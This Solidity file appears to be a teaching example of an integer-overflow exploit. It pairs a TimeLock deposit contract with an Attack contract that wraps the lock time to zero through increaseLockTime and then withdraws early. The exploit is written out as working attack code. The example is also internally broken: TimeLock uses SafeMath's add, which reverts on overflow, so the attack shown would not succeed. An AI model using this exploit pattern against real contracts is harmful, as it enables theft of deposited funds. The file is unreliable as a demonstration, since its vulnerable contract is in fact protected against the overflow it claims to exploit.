// SPDX-License-Identifier: MIT
pragma solidity 0.6.11;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/math/SafeMath.sol";

contract TimeLock {

    using SafeMath for uint;
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] = balances[ msg.sender].add(msg.value);
        lockTime[msg.sender] = now + 1 weeks;
    }

    function increaseLockTime (uint _secondsToIncrease) public {
        lockTime[ msg.sender] = lockTime[ msg.sender].add( _secondsToIncrease);
    }

    function withdraw () public {
        require(balances[ msg.sender] > 0, "Insufficient funds");
        require(now > lockTime[ msg.sender], "Lock time not expired");
        uint amount = balances[ msg.sender];
        balances[ msg.sender] = 0;
        ( bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}


contract Attack {

    TimeLock timeLock;

    constructor (TimeLock _timeLock) public {
        timeLock = TimeLock (_timeLock);
    }

    fallback () external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        /*
        if t = current lock time then we need to find x such that
        x + t = 2**256 = 0
        so x = -t
        */
        timeLock. increaseLockTime (
            uint(-timeLock. lockTime (address(this)))
        );
        timeLock. withdraw ();
    }
}
